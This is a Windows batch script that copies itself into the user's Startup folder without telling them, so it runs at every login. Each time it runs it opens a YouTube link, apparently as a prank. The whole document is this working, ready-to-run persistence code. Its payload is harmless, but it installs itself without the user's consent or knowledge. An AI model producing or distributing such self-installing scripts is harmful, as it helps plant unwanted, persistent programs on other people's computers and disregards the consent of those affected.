@echo off
for /f "delims=: tokens=*" %%A in ('findstr /b ::: "%~f0"') do @echo(%%A

if exist "%userprofile%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/%~n0%~x0" (
start "" https://youtu.be/xvFZjo5PgG0?si=7EvheP5qV0sNY2sa
pause

) else (
copy /y %~f0 "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\"
start "" https://youtu.be/xvFZjo5PgG0?si=7EvheP5qV0sNY2sa
)
cls
